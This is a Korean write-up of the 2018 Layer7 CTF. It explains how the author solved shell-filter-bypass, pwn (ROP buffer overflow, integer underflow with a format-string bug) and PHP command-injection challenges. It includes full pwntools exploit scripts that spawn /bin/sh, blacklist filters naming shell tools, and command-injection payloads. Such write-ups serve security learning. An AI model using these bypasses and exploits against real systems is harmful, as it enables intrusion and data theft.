# Layer7 CTF Write-up

2018년 9월 15일 10:00 ~ 2018년 9월 16일 22:00 (36시간)

Rand : 5

NickName : Dflower

Name : 권예준(선린인터넷고)

## MISC

### Sanity Check - 1pt

슥슥삭삭

#### FLAG : LAYER7{1_h0pE_Y0u_eNj0y_p14yiNg!}


### Shell program - 200pt

```
fliter = "|\\\"'`@c~!*?-_+=,";

v1 = strstr(a1, "flag") != 0LL;
v2 = (strstr(a1, "bin") != 0LL) + v1;
v3 = (strstr(a1, "sh") != 0LL) + v2;
v4 = (strstr(a1, "cat") != 0LL) + v3;
v5 = (strstr(a1, "more") != 0LL) + v4;
v6 = (strstr(a1, "less") != 0LL) + v5;
v7 = (strstr(a1, "echo") != 0LL) + v6;
v8 = (strstr(a1, "head") != 0LL) + v7;
v9 = (strstr(a1, "tail") != 0LL) + v8;
v10 = (strstr(a1, "dir") != 0LL) + v9;
v11 = (strstr(a1, "export") != 0LL) + v10;
v12 = (strstr(a1, "env") != 0LL) + v11;
v13 = (strstr(a1, "file") != 0LL) + v12;
v14 = (strstr(a1, "strings") != 0LL) + v13;
v15 = (strstr(a1, "grep") != 0LL) + v14;
v16 = (strstr(a1, "curl") != 0LL) + v15;
v17 = (strstr(a1, "rm") != 0LL) + v16;
v18 = (strstr(a1, "()") != 0LL) + v17;
v19 = (strstr(a1, "[]") != 0LL) + v18;
return (strstr(a1, "{}") != 0LL) + v19;
```

바이너리를 열어보니 저 정도의 필터링을 우회하면 되는 거 같다.

ping에서 "" 쌍따옴표를 이용해서 system 함수를 호출하기 때문에 $를 이용해서 원하는 커맨드를 실행시킬 수 있다.

$($SHELL 1>&0) 으로 쉘을 따고 플래그 파일을 읽어올 수 있었다.

#### FLAG : LAYER7{Wha4AAa4t_d03$_th1$_ch4r4ct3r_r3tuuuuurn?_$$$}


### Shell program revenge - 275pt

출제자가 처음에 낸 문제가 생각보다 많이 풀려서 그런지 revenge로 다시낸 듯 하다.

하지만 달라진건 없었다. 솔버가 한명만 줄었기 때문이다.

```
filter = "|\\\"'`@c!*?-_+=,";

v1 = strstr(a1, "flag") != 0LL;
v2 = (strstr(a1, "bin") != 0LL) + v1;
v3 = (strstr(a1, "sh") != 0LL) + v2;
v4 = (strstr(a1, "cat") != 0LL) + v3;
v5 = (strstr(a1, "more") != 0LL) + v4;
v6 = (strstr(a1, "less") != 0LL) + v5;
v7 = (strstr(a1, "echo") != 0LL) + v6;
v8 = (strstr(a1, "head") != 0LL) + v7;
v9 = (strstr(a1, "tail") != 0LL) + v8;
v10 = (strstr(a1, "dir") != 0LL) + v9;
v11 = (strstr(a1, "export") != 0LL) + v10;
v12 = (strstr(a1, "env") != 0LL) + v11;
v13 = (strstr(a1, "file") != 0LL) + v12;
v14 = (strstr(a1, "strings") != 0LL) + v13;
v15 = (strstr(a1, "grep") != 0LL) + v14;
v16 = (strstr(a1, "curl") != 0LL) + v15;
v17 = (strstr(a1, "rm") != 0LL) + v16;
v18 = (strstr(a1, "()") != 0LL) + v17;
v19 = (strstr(a1, "[]") != 0LL) + v18;
return (strstr(a1, "{}") != 0LL) + v19;
```

추가된 필터링은 따로 없어보였는데, 달라진 점이라면 환경변수들을 지워버렸다.

```
const char *set_env()
{
  size_t v0; // rax
  const char *result; // rax
  const char **i; // [rsp+8h] [rbp-8h]

  for ( i = environ; ; ++i )
  {
    result = *i;
    if ( !*i )
      break;
    v0 = strlen(*i);
    memset(*i, 0, v0);
  }
  return result;
}
```

하지만 PATH가 제대로 지워지지 않았나 보다. 

$(vi 1>&0) 로 플래그 파일을 읽어올 수 있었다.

#### FLAG : LAYER7{w0W...H0w_t0_th1s_Fuck11111111ng_fi1t3r1ng_by-p4ss!!!!!!!!!???}


## Pwn

### talmoru_party~! - 100pt

```
Welcome to talmo world!!!
Who's that "Real" talmo!!?
Maybe...captain..?
------------------
1. LeeWonPeng
2. AhnGeonHee
3. MunSiWoo
4. KwonMinSeong
5. I'm talmo
------------------
```

바이너리를 실행시켜보면 누가 '진짜' 탈모인지 
물어본다.

난 문시우가 탈모란 것을 이미 알고 있었기때문에
주저 없이 문시우를 선택했다.

```
Wow!!!! gratz!!
Your right!! MunSiWoo is "Real talmo"!!
tell me your impression plz!
```

위와 같은 문구가 나오고 hexray를 보게 되면

```
int vuln()
{
  char s; // [esp+0h] [ebp-40h]

  puts("Wow!!!! gratz!!");
  puts("Your right!! MunSiWoo is \"Real talmo\"!!");
  puts("tell me your impression plz!");
  fgets(&s, 0x20000, stdin);
  printf("Your impression : ");
  puts(&s);
  return puts("Good bye~~!");
}
```

다음과 같이 BOF가 발생하는 것을 볼 수 있다.
ROP 해주면 된다.

<ul><li>ex.py</li></ul>

```
from pwn import *

e = ELF("./talmo_party")
#p = process(e.path)
p = remote("layer7.kr",12003)
libc = ELF("./layer7.so.6")
#libc = e.libc
context.log_level = 'debug'
pr = 0x08048866
pppr = 0x08048849

p.sendlineafter(">>","3")

payload = "a"*0x44
payload += p32(e.plt['puts']) + p32(pr) +p32(e.got['puts']) + p32(0x080486E0)
p.sendline(payload)

p.recvuntil("Good bye~~!\n")
puts = u32(p.recv(4))
libc_base = puts - libc.symbols['puts']
system = libc_base + libc.symbols['system']
read = libc_base + libc.symbols['read']

print(hex(libc_base))

p.recvuntil("plz!\n")
bin_sh = "/bin/sh\x00"

payload = "a"*0x44 + p32(read)+p32(pppr)+p32(0)+p32(0x0804A02C)+p32(len(bin_sh))
payload += p32(system)+"AAAA"+p32(0x0804A02C)

p.sendline(payload)
p.sendline(bin_sh)
p.interactive()
```

#### FLAG : LAYER7{1_r3411y_H4t3_t41m0_^______^}


### Life game - 150pt

바이너리를 열어보면 은행시스템과 돈을 벌 수 있는 메뉴들이 보이고 또 31337이라는 특별한 메뉴가 보인다.

```
int flag()
{
  char s; // [esp+0h] [ebp-A8h]
  char format; // [esp+80h] [ebp-28h]
  FILE *stream; // [esp+A0h] [ebp-8h]
  char *v4; // [esp+A4h] [ebp-4h]

  v4 = &s;
  if ( money > 99999 )
  {
    stream = fopen("./flag.txt", "r+");
    if ( !stream )
    {
      puts("Open Error...");
      puts("plz Contact us");
    }
    fgets(&s, 100, stream);
    printf("Flag is %p <- here!\n", v4);
    puts("Oh... you succeeded..!!");
    puts("The last one");
    fgets(&format, 6, stdin);
    printf("your last one : ");
    printf(&format);
    puts("Good Bye~!");
    exit(0);
  }
  return puts("wtf? Get out...!");
}
```

돈이 99999원보다 많으면 flag.txt를 읽어 변수에 저장하고, 그 변수의 주소값을 알려준다. 그리고 포맷스트링 버그가 발생하는 것으로 보아 그냥 포맷스트링 버그를 이용해서 플래그를 읽어오면 될 거 같았다.

문제는 돈을 어떻게 읽어오느냐 였는데, 보통 CTF에서 은행시스템이 나오면 음수를 이용해서 돈을 모으는 경우가 많았기 때문에 음수체크를 하는 지 보았다.

```
if ( v2 == 3 )
      {
        printf("you can loan max %d\n", loan_money);
        puts("How much?");
        __isoc99_scanf("%d", &v1);
        if ( v1 <= loan_money )
        {
          loan_money -= v1;
          money += v1;
          puts__();
          printf("money : %d\n", money);
          printf("loan money : %d\n", loan_money);
          puts__();
        }
        else
        {
          puts("No...!");
        }
      }
```

Loan 이라는 돈을 빌리는 메뉴에서 음수체크를 따로 하지 않는다는 것을 보았고, 이를 이용해 Integer underflow로 돈을 모은 뒤, 포맷스트링으로 슥슥삭삭 했다.

<ul><li>ex.py</li></ul>

```
from pwn import *

context.log_level = 'debug'
flag = ""

for i in range(1,12):
    p = remote("layer7.kr",12000)

    p.recv()
    p.sendline("5")

    p.recv()
    p.sendline("3")

    p.sendlineafter("much?\n","-100000")

    p.recv()
    p.sendline("3")

    p.sendlineafter("much?\n","-100000000000")

    p.recv()
    p.sendline("5")

    p.recv()
    p.sendline("31337")

    payload = "%{0}$p".format(i)
    p.sendline(payload)
    
    p.recvuntil(": 0x")
    tmp = p.recvuntil("G")[:-1]
    flag += chr(int("0x"+tmp[6:8],16)) +  chr(int("0x"+tmp[4:6],16)) + chr(int("0x"+tmp[2:4],16)) + chr(int("0x"+tmp[0:2],16))
    p.close()

print(flag)
```

#### FLAG : LAYER7{L1f3..1s..P0k3m0n_or_D1g1m0n..wh4t}


## Web

### url routing - 150pt

```
http://dm1536803965686.fun25.co.kr:23902/5099d288498b4e17/?%66%6c%61%67
```

위와 같이 입력해주면

```
http://dm1536803965686.fun25.co.kr:23902/5099d288498b4e17/?flag
```

이렇게 바뀌어서 플래그를 뱉는다.

#### FLAG : LAYER7{4f3a6c9f4b9c36ed3c39b8d3e14aa4fb}


### meow - 160pt

```
<?php 
    require __DIR__.'/flag.php'; 

    if(isset($_GET['file'])){ 
        if(preg_match('/flag|\'|\"|`|\\\\|;|\(|\)|\*|\?|\.\.|\//i', $_GET['file'])){ 
            die('no hack'); 
        } 
        system('cat "'.$_GET['file'].'"'); 

    }else{ 
        header('Location: ?file=test.txt'); 

    } 

    echo '<hr>'; 
    highlight_file(__FILE__);
```

cmd injection이다. flag.php 를 읽으면 되나보다.

```
http://dm1536803965686.fun25.co.kr:23903/74cdf2ead84d1743/?file=f$@lag.php
```

$@가 없는 변수여서 아무것도 반환을 안한다.

따라서 파일명에는 flag.php 라는 문자열이 들어가게 되고 플래그를 뱉는다.(주석으로,,)

#### FLAG : LAYER7{070e260558a03c1494817459ebbc060e}
